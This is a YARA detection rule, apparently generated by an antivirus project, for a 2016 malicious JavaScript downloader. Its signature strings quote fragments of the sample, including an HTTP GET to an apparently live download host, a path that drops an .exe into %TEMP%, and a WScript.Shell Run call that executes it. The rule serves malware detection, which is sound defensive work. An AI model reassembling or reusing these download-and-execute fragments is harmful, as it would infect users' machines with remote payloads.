rule sig_20160328_a147492fa6e385edfb251e64ac88f5de {
  meta:
    description = "datamaliciousorder - file 20160328_a147492fa6e385edfb251e64ac88f5de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "227a24f4474c0056f68ac679c63153fe64bb438af04d69a6aae5544847ff09c7"

  strings:
    $s1  = "function Hntafevd() {return Cutdsq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7yFGvQ5kiHEWMoaB.exe\";};" fullword ascii
    $s2  = "Uynubptru[Ghand](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Uloeh](Wyqcjxlgz() * 11)} while (Uynubptru[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Cutdsq = function Hlqrhmrb() {return WScript[Gltktfssi](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Deuxmoade(Iqyevbrix, Uacwmz){return Iqyevbrix - Uacwmz;};" fullword ascii
    $s6  = "function Sqjaghrwv() {return ((Ahdnxrwzr == true) && (Ahdnxrwzr == Xxzekbbz)) ? 1 : Dnlfftsddx;};" fullword ascii
    $s7  = "function Kaifp(Vrbel){Cutdsq[\"Run\"](Vrbel, Dnlfftsddx, Dnlfftsddx);};" fullword ascii
    $s8  = "Xxzekbbz = true; " fullword ascii
    $s9  = "Ahdnxrwzr = true; " fullword ascii
    $s10 = "function Oelrbjgoze()" fullword ascii
    $s11 = "function Aceriidxy(){return Gltktfssi;};" fullword ascii
    $s12 = "function Zqlnkae(Bmbmadopxb) {var Wibre = (1, 2, 3, 4, 5, Bmbmadopxb); return Wibre;};" fullword ascii
    $s13 = "function Wyqcjxlgz(){return 22;};" fullword ascii
    $s14 = " while (Omwqhq){" fullword ascii
    $s15 = "var Ahdnxrwzr = false;" fullword ascii
    $s16 = "var Cenxjywla = new this[\"Date\"]();" fullword ascii
    $s17 = "var Xxzekbbz = false;" fullword ascii
    $s18 = "var Hiaxbimdh = false;" fullword ascii
    $s19 = "return Deuxmoade(Ynmja, Lojlqt);" fullword ascii
    $s20 = "} catch(Peztbgyejm){Omwqhq = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}